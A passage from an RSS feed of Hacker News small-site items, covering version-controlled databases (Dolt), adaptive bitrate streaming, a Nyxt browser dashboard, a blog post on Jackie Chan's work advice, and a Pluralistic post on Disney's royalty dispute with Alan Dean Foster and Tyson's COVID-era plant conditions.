<p>As consequence of choosing the MySQL standard is compatibility with a huge ecosystem of tools that connect to Dolt out of the box. A quick look at our <a href="https://www.dolthub.com/docs/integrations/programmatic-clients/">docs</a> shows nine programming languages with tested MySQL connectors that work with Dolt. For folks that know SQL, and one of those nine programming languages, getting started with Dolt should be straight forward.</p>
<p>This design decision does not come without costs. The underlying commit graph storage is not a natural fit for a SQL query engine, and implementing a super set of MySQL on top of that storage layer is a huge technical commitment. Not only are we committed to matching everything MySQL can do, but we also have to design a set of functions to expose the commit graph in our SQL engine.</p>
<h2>Conclusion</h2>
<p>The software industry has long considered version control something that is <em>done to</em> databases, not a <em>feature of</em> databases. At DoltHub we consider "version controlled database" to be a product category, and Dolt is our attempt at a product that fits in that category.</p>
<p>Version control databases are not competitive with the <em>practice</em> of version controlling your database schema, or products that implement that practice. Instead they are a relatively novel category of databases differentiated by features that cater to users who care about capabilities that support collaboration, versioning, reproducibility, and distribution. By making these capabilities native to Dolt we hope to enable users to elevate the quality of their data infrastructure without the need to write and maintain application code, as well as open up possibilities that simply did not exist before.</p>
<p>If you want to talk to us about how you might use <a href="https://doltdb.com/">Dolt</a>, or DoltHub, feel free to <a href="https://www.dolthub.com/contact">get in touch</a> via email, or join us on <a href="https://discord.com/invite/RFwfYpu">Discord</a>.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-11-17-version-control-databases-defining-a-category/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25152907</guid>
            <pubDate>Thu, 19 Nov 2020 18:49:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Adaptive Bitrate Streaming? Why Does It Matter?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25152080">thread link</a>) | @kerrarbone
<br/>
November 19, 2020 | https://antmedia.io/adaptive-bitrate-streaming/ | <a href="https://web.archive.org/web/*/https://antmedia.io/adaptive-bitrate-streaming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="panel-34820-1-1-1" data-index="5"><div>
<div> <p><span>Adaptive streaming allows the video provider to create a different video for each of the screen sizes, devices or </span><span>connection speed</span><span> that he or she wishes to target.&nbsp;</span></p> <p><span>When there are multi-bitrates on the server-side, Ant Media Server measures the viewers' internet speed and sends the best quality according to the internet speed of the viewer.&nbsp; For instance,</span></p> <p><strong>Assume that there are two bitrates on the server</strong></p> <p>-The first one is 360p and 800kbps</p> <p>-The second one is 480p and 1500kbps.</p> <p><strong>if Viewer internet speed</strong></p> <p>-is above 1500kbps, then the resolution with 480p is sent.</p> <p>-is between 800kbps and 1500kbps or less than 800kbps, then the resolution with 360p is sent.</p></div></div></div></div>]]>
            </description>
            <link>https://antmedia.io/adaptive-bitrate-streaming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25152080</guid>
            <pubDate>Thu, 19 Nov 2020 17:45:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dashboard for Nyxt]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25151976">thread link</a>) | @jmercouris
<br/>
November 19, 2020 | https://nyxt.atlas.engineer/article/dashboard.org | <a href="https://web.archive.org/web/*/https://nyxt.atlas.engineer/article/dashboard.org">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <meta name="author" content="By John Mercouris">
  <title>Nyxt Dashboard</title>
  
  
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->


<header>


</header>
<p>We are excited to introduce the new built-in Nyxt dashboard! (this feature will be available in the next release of Nyxt).</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/dashboard.png"></p>
<p>The dashboard in Nyxt can be configured to show any available system information, processes running, disk space available, the weather, etc. If the information is available, the dashboard can display it.</p>

<p>Use the following snippet within your configuration file to enable the built-in dashboard:</p>

<p>If you wish to specify a different dashboard function (for example, a function of your own making), pass a different function to <code>make-startup-function</code>.</p>
<p>In creating a new dashboard function, you'll be able to produce any layout/information you wish- that is how you can completely customize the dashboard.</p>

<p>The built-in dashboard uses an internal buffer. Therefore, to change its appearance, you can change the <code>style</code> of the <code>internal-buffer</code> class. Changing this will effect all of your interal buffers (examples include: bookmark listing, buffer listing, message listing, help pages, etc)- resulting in an easily configurable, consistent style.</p>
<p>In doing so you can make Nyxt look exactly how you want!</p>
<p><img src="https://nyxt.atlas.engineer/static/image/article/dashboard-dark.png"></p>
<p>Thanks for reading :-)</p>


</div></div>]]>
            </description>
            <link>https://nyxt.atlas.engineer/article/dashboard.org</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151976</guid>
            <pubDate>Thu, 19 Nov 2020 17:36:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jackie Chan's Best Advice]]>
            </title>
            <description>
<![CDATA[
Score 81 | Comments 53 (<a href="https://news.ycombinator.com/item?id=25151667">thread link</a>) | @oDot
<br/>
November 19, 2020 | https://www.weedonandscott.com/blog/post/jackie-chan-best-advice/ | <a href="https://web.archive.org/web/*/https://www.weedonandscott.com/blog/post/jackie-chan-best-advice/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>
      
    
<p>
  <iframe src="https://www.youtube.com/embed/TqM1oX7Ckfc" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<blockquote>
<p>Whatever you do, do the best you can, because the film live forever. â€œNo, because, you know, that day raining and the actor donâ€™t have timeâ€. I said â€œWould you go to every theater to tell the audience?â€ No! The audience sit in the theater â€“ â€œgood movieâ€, â€œbad movieâ€. Thatâ€™s all.</p>
</blockquote>
<p>I try to follow it with everything I do. With professional work â€“ the software I create, the screenplays I write and the films I produce. With my personal life â€“ how I talk to people, the things I buy and the cleanliness of my house.</p>
<p>To function, it must be implemented at every level. To do the best we can in software work, we must do the best we can with every line of code, email to a client and commit message. We will not clean our house the best we can unless we take care to pull out a toothbrush when needed, and even research the right toothbrush to have in our cleaning kit (donâ€™t worry, any will do).</p>
<p>I can hear you already, â€œitâ€™s too mentally tasking to doâ€. That line of thought is exactly what Jackie Chan advises us against. Even when the reservation is true, even when itâ€™s raining and the actor doesnâ€™t have time, we should ask ourselves â€œhow can this be done despite the troubleâ€. Same thing goes for the advice itself. Instead of dismissing it on the account of mental load, one should ask â€œHow can I apply this in my life anyway?â€</p>
<p>Do no conflate â€œthe best you canâ€ with â€œperfectâ€. They are different things. â€œThe best you canâ€ refers to achieving goals. Goals usually combine all considerations, rather than the focus on an isolated metric of quality. The goal to have good breakfast will not be achieved the best you can if you eternally postpone it trying to perfect a french omelette.</p>
<p>Not any goal will do. Goals must adhere to high standards. That is why it can take Jackie Chan a year to film a movie. He takes the time needed to do the best he can, and still, he says, can see the imperfections when watching his own work. We should balance.</p>
<p>Yet it is true. Even though itâ€™s somewhat of an â€œobviousâ€ insight, it is very hard to put into practice. Around every corner hides a legitimate reason to do less.</p>
<p>We must remember that having reasons does not turn a failure to success. End results are completely unaffected by rationalization as to why they should or shouldnâ€™t be the way they are.</p>
<p>An end result is just is.</p>



      
    </article>
    
    
      
      
</div></div>]]>
            </description>
            <link>https://www.weedonandscott.com/blog/post/jackie-chan-best-advice/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151667</guid>
            <pubDate>Thu, 19 Nov 2020 17:13:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[API data privacy and governance in the healthcare digital transformation]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151448">thread link</a>) | @apitracker
<br/>
November 19, 2020 | https://www.hoss.com/resource/2020-healthcare-whitepaper | <a href="https://web.archive.org/web/*/https://www.hoss.com/resource/2020-healthcare-whitepaper">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-component="container"><article><header><p><strong>Hoss</strong></p></header><figure><img src="https://www.hoss.com/assets/resources/healthcarewhitepaper.png"></figure><main data-post-content=""><p>New ways of using, managing and sharing important health data are triggering massive change across the entire continuum of healthcare. New technologies are creating better ways for providers to care for patients and for payers to reduce costs and leverage powerful analytics â€“ whether itâ€™s more effectively managing chronic illnesses by enabling real-time contact with doctors or seamlessly facilitating the flow of health information between coordinating parties. This digital transformation is happening quickly, and it is critical that healthcare organizations understand the trends driving this transformation and the challenges they bring to survive in the era of digital health.</p>
</main></article></div></div>]]>
            </description>
            <link>https://www.hoss.com/resource/2020-healthcare-whitepaper</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151448</guid>
            <pubDate>Thu, 19 Nov 2020 16:56:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The New Era of Developer Experience: Delivering World-Class Support]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25151420">thread link</a>) | @apitracker
<br/>
November 19, 2020 | https://www.hoss.com/resource/delivering-world-class-support-in-a-competitive-landscape | <a href="https://web.archive.org/web/*/https://www.hoss.com/resource/delivering-world-class-support-in-a-competitive-landscape">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>Download Now</strong><span>Enter your email address to download this Hoss resource.</span></p></div></div></div>]]>
            </description>
            <link>https://www.hoss.com/resource/delivering-world-class-support-in-a-competitive-landscape</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151420</guid>
            <pubDate>Thu, 19 Nov 2020 16:54:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Disney Stiffs SF Writer Alan Dean Foster]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25151408">thread link</a>) | @samizdis
<br/>
November 19, 2020 | https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay | <a href="https://web.archive.org/web/*/https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1606">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
tyson, labor, covid, late-stage capitalism, guillotine watch, dearmickey, disneymustpay,alan dean foster, copyright, copyfight, chickenization, monopolies, contracts, sfwa, publishing, writing, disney, attack surface lectures, attack surface, science fiction, cyberpunk

Summary:
Cyberpunk and Post-Cyberpunk; Disney stiffs writer; Tyson execs bet on covid spread in unsafe plant

URL:
https://pluralistic.net/2020/11/19/disneymustpay/

Title:
Pluralistic: 19 Nov 2020 disneymustpay

Bullet:
ğŸ§›ğŸ¼â€â™€ï¸

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: JWZ (https://www.jwz.org/blog/).

--><br>
<a href="https://pluralistic.net/2020/11/19/disneymustpay/"><img src="https://i0.wp.com/craphound.com/images/19Nov2020.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/19Nov2020.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#asl">Cyberpunk and Post-Cyberpunk</a>: Bruce Sterling and Christopher Brown on the Attack Surface Lectures.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay">Disney stiffs writer</a>: Sure, what's new, but this is next-level fuckery #DisneyMustPay.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#you-bet-your-life">Tyson execs bet on covid spread in unsafe plant</a>: Upton Sinclair was an optimist.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#retro">This day in history</a>: 2010, 2015, 2019
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/19/disneymustpay/#bragsheet">Colophon</a>: Recent publications, upcoming appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="asl"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Doctorow-Attack-Surface-Tour-Graphics-Twitter.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Doctorow-Attack-Surface-Tour-Graphics-Twitter.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Today on the Attack Surface Lectures (a series of 8 panels exploring themes from the third Little Brother book, hosted by Tor Books and 8 indie bookstores): Cyberpunk &amp; Post-Cyberpunk with Christopher Brown and Bruce Sterling, which Anderson's hosted on Oct 19.</p>
<p><a href="https://www.youtube.com/watch?v=xLlfrayuKAw">https://www.youtube.com/watch?v=xLlfrayuKAw</a></p>
<p>You can watch it without Youtube's surveillance courtesy of the Internet Archive:</p>
<p><a href="https://archive.org/details/asl-cyberpunk">https://archive.org/details/asl-cyberpunk</a></p>
<p>Or get the audio as an MP3:</p>
<p><a href="https://archive.org/download/asl-cyberpunk/Cyberpunk%20with%20Bruce%20Sterling%20and%20Christopher%20Brown.mp3">https://archive.org/download/asl-cyberpunk/Cyberpunk%20with%20Bruce%20Sterling%20and%20Christopher%20Brown.mp3</a></p>
<p>Earlier instalments in the series:</p>
<p>I. Politics and Protest (with Eva Galperin and Ron Deibert, hosted by The Strand):</p>
<p><a href="https://craphound.com/attacksurface/2020/11/16/the-attack-surface-lectures-politics-and-protest-fixed/">https://craphound.com/attacksurface/2020/11/16/the-attack-surface-lectures-politics-and-protest-fixed/</a></p>
<p>II. Cross-Media Sci-Fi (with Amber Benson and John Rogers, hosted by the Brookline Booksmith):</p>
<p><a href="https://craphound.com/attacksurface/2020/11/17/the-attack-surface-lectures-cross-media-sci-fi/">https://craphound.com/attacksurface/2020/11/17/the-attack-surface-lectures-cross-media-sci-fi/</a></p>
<p>III. Race, surveillance and tech (Meredith Whittaker and Malkia Devich-Cyril, hosted by The Booksmith):</p>
<p><a href="https://craphound.com/attacksurface/2020/11/18/the-attack-surface-lectures-intersectionality-race-surveillance-and-tech-and-its-history/">https://craphound.com/attacksurface/2020/11/18/the-attack-surface-lectures-intersectionality-race-surveillance-and-tech-and-its-history/</a></p>
<p>Here's a master post with all the media as it is goes live:</p>
<p><a href="https://craphound.com/news/2020/11/16/attack-surface-lectures-master-post/">https://craphound.com/news/2020/11/16/attack-surface-lectures-master-post/</a></p>
<p>And you can also get this as it's posted on my podcast feed â€“ search for "Cory Doctorow podcast" in your podcatcher or use the RSS:</p>
<p><a href="https://feeds.feedburner.com/doctorow_podcast">https://feeds.feedburner.com/doctorow_podcast</a></p>
<hr>
<p><a name="disneymustpay"></a><br>
<img src="https://i0.wp.com/craphound.com/images/Disney-Must-Pay-Basic-Text-768x432.jpg?resize=768%2C432&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/Disney-Must-Pay-Basic-Text-768x432.jpg?resize=768%2C432&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Alan Dean Foster is an sf legend â€“ a writer who produced a shelf of original novels but also made a reputation novelizing movies and TV from Star Wars to Aliens, turning out books that transcended quickie adaptations, becoming beloved bestsellers in their own right.</p>
<p>Disney now owns a bunch of these books, thanks to their acquisitions of Lucas and Fox, and these books continue to sell briskly. Disney not only isn't paying Foster any royalties for these books â€“ they're refusing to even issue him royalty statements.</p>
<p><a href="https://www.sfwa.org/2020/11/18/disney-must-pay/">https://www.sfwa.org/2020/11/18/disney-must-pay/</a></p>
<p>Disney has blackholed Foster's agents and lawyers, and also the Science Fiction Writers of America (SFWA); to the extent that they have communicated with him, they have espoused a radical (jaw dropping) copyright theory.</p>
<p>This is Disney's theory: When they bought Lucas and Fox, they acquired the copyright licenses that enabled them to sell the Foster's books â€“ but not the liability, the legal obligation to pay him for his books.</p>
<p>As SFWA president Mary Robinette Kowal says, this theory could absolutely upend the nature of copyright itself. Any publisher that wanted to go on making money from an author without paying them could simply sell the rights to a sister company, which then denies any obligations.</p>
<p>Foster brought his case to SFWA's grievance committee â€“ a group that has worked on my behalf in the past, extracting a fee from a multinational publisher that commissioned and accepted a story from me but then offered an odious and unacceptable contract they refused to amend.</p>
<p>Usually griefcom work happens in the background: a SFWA member goes to griefcom, griefcom goes to the publisher, the publisher settles. This is the first time in more than a decade that SFWA has gone public with a complaint.</p>
<p>To be fair, Disney <em>did</em> offer to meet with Foster, but demanded that he sign an NDA <em>prior</em> to any negotiation. This is Not Normal. Sometimes the OUTCOME of a negotiation is confidential, but you don't go into a negotiation under NDA.</p>
<p>Disney appears to be taking a page from the cartoonish villain Scooter Braun, who refused to meet with Taylor Swift about buying back the rights to her masters without an NDA.</p>
<p><a href="https://twitter.com/taylorswift13/status/1328471874318311425">https://twitter.com/taylorswift13/status/1328471874318311425</a></p>
<p>Foster's case is a gross injustice. He has cancer and his wife is ill. He wrote these books, Disney bought them. They're making money from them. They owe him money. Period.</p>
<p>But beyond the individual injustice being visited upon Foster, Kowal and SFWA worry that this represents a suite of new, corporate anti-writer tactics: flipping assets without liabilities, refusing to talk about it without an NDA.</p>
<p>You can follow Foster's case with the #DisneyMustPay hashtag. If you're a writer facing similar tactics (even if you're not a SFWA member), they're seeking your story, via this form:</p>
<p><a href="https://airtable.com/shrr2S8rs4pcokske">https://airtable.com/shrr2S8rs4pcokske</a></p>
<hr>
<p><a name="you-bet-your-life"></a><br>
<img src="https://i0.wp.com/craphound.com/images/x1080.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/x1080.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Remember last April, when US meatpacking giants like Tyson were the epicenter of runaway superspreader events that slaughtered the poor, precarious, racialized workers who toiled under brutal and unsafe conditions?</p>
<p>One of the hardest-hit was Tyson's Waterloo, IA plant (the largest meat packing plant in America), where workers were denied PPE, forced to work without social distancing, and where more than 1,000 of them contracted covid. Many died.</p>
<p>One of the dead is Isidro Fernandez. In a wrongful death suit, his lawyers revealed details of Tyson's abuse of its workers that shock the conscience, like the fact that manager Tom Hart ran a betting pool on how many workers would contract covid.</p>
<p><a href="https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/">https://iowacapitaldispatch.com/2020/11/18/lawsuit-tyson-managers-bet-money-on-how-many-workers-would-contract-covid-19/</a></p>
<p>The suit also claims senior manager John Casey told supervisors that they were required to report for work even if they had symptoms, calling covid a "glorified flu." He forced a supervisor to cancel a testing appointment, saying "We all have symptoms â€“ you have a job to do."</p>
<p>A worker who was so sick he vomited on the line was ordered back to work the next day.</p>
<p>As conditions in the plant deteriorated, Tyson managers stopped visiting the floor altogether in a bid to protect themselves. Instead, they delegated to inexperienced supervisors.</p>
<p>They also told workers they would only be eligible for a $500 "thank you bonus" if they reported for every shift they were scheduled to work, regardless of whether they were sick and contagious.</p>
<p>All of this was justified â€“ by Tyson and its enablers in the GOP â€“ as a necessary, regrettable part of keeping America fed during the lockdown. But Tyson's breakneck meat-packing wasn't primarily domestic: they were serving the Chinese market.</p>
<p>Chinese meat-packers had largely been mothballed to spare workers from the virus; as a result, the company was able to increase its exports to China by 600% during Q1-2020.</p>
<p>But this isn't the story that Tyson's execs told Governor Kim Reynolds when they lobbied for exemptions from liability for the employees they maimed and murdered during the same period â€“ they claimed it was all patriotic zeal to feed America.</p>
<p>The case has moved to federal court, thanks to Trump's invocation of the Defense Production Act, which ordered Tyson to stay open during the lockdown.</p>
<hr>
<p><a name="retro"></a><br>
<img src="https://i0.wp.com/craphound.com/images/wayback-machine-hed-796x416.png?resize=796%2C416&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/wayback-machine-hed-796x416.png?resize=796%2C416&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>#10yrsago TSA confiscates heavily-armed soldiersâ€™ nail-clippers <a href="https://redstate.com/erick/2010/11/18/another-tsa-outrage-n37064">https://redstate.com/erick/2010/11/18/another-tsa-outrage-n37064</a></p>
<p>#5yrsago Manhattan DA calls for backdoors in all mobile operating systems <a href="https://web.archive.org/web/20151120003032/https://www.manhattanda.org/sites/default/files/11.18.15%20Report%20on%20Smartphone%20Encryption%20and%20Public%20Safety.pdf">https://web.archive.org/web/20151120003032/https://www.manhattanda.org/sites/default/files/11.18.15%20Report%20on%20Smartphone%20Encryption%20and%20Public%20Safety.pdf</a></p>
<p>#1yrago Coopâ€™s tribute to Randotti Skulls, from the golden age of Haunted Mansion merchandise <a href="https://memex.craphound.com/2019/11/18/coops-tribute-to-randotti-skulls-from-the-golden-age-of-haunted-mansion-merchandise/">https://memex.craphound.com/2019/11/18/coops-tribute-to-randotti-skulls-from-the-golden-age-of-haunted-mansion-merchandise/</a></p>
<hr>
<p><a name="bragsheet"></a><br>
<img src="https://i1.wp.com/craphound.com/images/colophonimages.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/colophonimages.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Today's top sources: JWZ (<a href="https://www.jwz.org/blog/">https://www.jwz.org/blog/</a>).</p>
<p>Currently writing: My next novel, "The Lost Cause," a post-GND novel about truth and reconciliation. Yesterday's progress: 513 words (85767 total).</p>
<p>Currently reading: The Ministry for the Future, Kim Stanley Robinson</p>
<p>Latest podcast: Someone Comes to Town, Someone Leaves Town (part 23) <a href="https://craphound.com/podcast/2020/11/16/someone-comes-to-town-someone-leaves-town-part-23/">https://craphound.com/podcast/2020/11/16/someone-comes-to-town-someone-leaves-town-part-23/</a></p>
<p>Upcoming appearances:</p>
<ul>
<li>Keynote, Cybersummit 2020, Nov 26 <a href="https://www.cybera.ca/cyber-summit-2020/">https://www.cybera.ca/cyber-summit-2020/</a>
</li>
<li>
<p>Keynote, Cologne Futures, Nov 27, details TBD</p>
</li>
<li>
<p>Beaverbrook Lecture: How to Destroy Surveillance Capitalism, Nov 30, <a href="https://www.mcgill.ca/maxbellschool/channels/event/2020-beaverbrook-annual-lecture-part-ii-cory-doctorow-325538">https://www.mcgill.ca/maxbellschool/channels/event/2020-beaverbrook-annual-lecture-part-ii-cory-doctorow-325538</a></p>
</li>
<li>
<p>Teach-In Against Surveillance, Dec 1, <a href="https://www.eventbrite.ca/e/teach-in-against-surveillance-tickets-128926228821">https://www.eventbrite.ca/e/teach-in-against-surveillance-tickets-128926228821</a></p>
</li>
<li>
<p>Keynote, NISO Plus, Feb 22-25, <a href="https://niso.plus/cory-doctorow-to-keynote-at-niso-plus-2021/">https://niso.plus/cory-doctorow-to-keynote-at-niso-plus-2021/</a></p>
</li>
</ul>
<p>Recent appearances:</p>
<ul>
<li>Fully Charged: The future of energy over the next 300 years<br>
<a href="https://fullycharged.show/podcasts/podcast-84-the-future-of-energy-over-the-next-300-years-cory-doctorow/">https://fullycharged.show/podcasts/podcast-84-the-future-of-energy-over-the-next-300-years-cory-doctorow/</a>
</li>
<li>
<p>Allen School Distinguished Lecture "Early Onset Oppenheimers"<br>
<a href="https://www.youtube.com/watch?v=Ep78A-jtcrE">https://www.youtube.com/watch?v=Ep78A-jtcrE</a></p>
</li>
<li>
<p>Author Stories Podcast<br>
<a href="https://www.youtube.com/watch?v=yxSPZn8EGTE">https://www.youtube.com/watch?v=yxSPZn8EGTE</a></p>
</li>
</ul>
<p>Latest book:</p>
<ul>
<li>"Attack Surface": The third Little Brother novel, a standalone technothriller for adults. The <em>Washington Post</em> called it "a political cyberthriller, vigorous, bold and savvy about the limits of revolution and resistance." Order signed, personalized copies from Dark Delicacies <a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">
</a></li><a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">
</a><li><a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">
</a><p><a href="https://www.darkdel.com/store/p1840/Available_Now%3A_Attack_Surface.html">"How to Destroy Surveillance Capitalism": an anti-monopoly pamphlet analyzing the true harms of surveillance capitalism and proposing a solution. </a><a href="https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59">https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59</a></p>
</li>
<li>
<p>"Little Brother/Homeland": A reissue omnibus edition with a new introduction by Edward Snowden: <a href="https://us.macmillan.com/books/9781250774583">https://us.macmillan.com/books/9781250774583</a>; personalized/signed copies here: <a href="https://www.darkdel.com/store/p1750/July%3A__Little_Brother_%26_Homeland.html">https://www.darkdel.com/store/p1750/July%3A__Little_Brother_%26_Homeland.html</a></p>
</li>
<li>
<p>"Poesy the Monster Slayer" a picture book about monsters, bedtime, gender, â€¦</p></li></ul></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay">https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2020/11/19/disneymustpay/#disneymustpay</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151408</guid>
            <pubDate>Thu, 19 Nov 2020 16:53:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 5 Best Home Hyperbaric Chambers Atlanta Hyperbaric Center]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151375">thread link</a>) | @evo_9
<br/>
November 19, 2020 | https://atlantahyperbariccenter.com/the-5-best-home-hyperbaric-chambers/ | <a href="https://web.archive.org/web/*/https://atlantahyperbariccenter.com/the-5-best-home-hyperbaric-chambers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"> <div> <div id="primary"> <main id="main"> <div data-elementor-type="single" data-elementor-id="353180" data-elementor-settings="[]"> <div> <section data-id="21fa3ea7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">   </section> <section data-id="2eb24965" data-element_type="section"> <div> <div> <div data-id="5774b908" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"> <div> <div> <div data-id="15927d68" data-element_type="widget" data-widget_type="theme-post-featured-image.default"> <div> <p><img width="440" height="1024" alt="5 Best Home Hyperbaric Chambers" sizes="(max-width: 440px) 100vw, 440px" nitro-lazy-srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers-.png 440w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--129x300.png 129w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--768x1788.png 768w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--660x1536.png 660w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--800x1863.png 800w" nitro-lazy-src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--440x1024.png" nitro-lazy-empty="" id="MTQ2ODo4NTA=-1" src="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--440x1024.png" srcset="https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers-.png 440w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--129x300.png 129w, https://v1.nitrocdn.com/mkPVOXCMdbrUlABSeUKXdeySnqXSQUcu/assets/static/optimized/rev-6136258/wp-content/uploads/2019/11/5-Best-Home-Hyperbaric-Chambers--768x1788.png 768w, 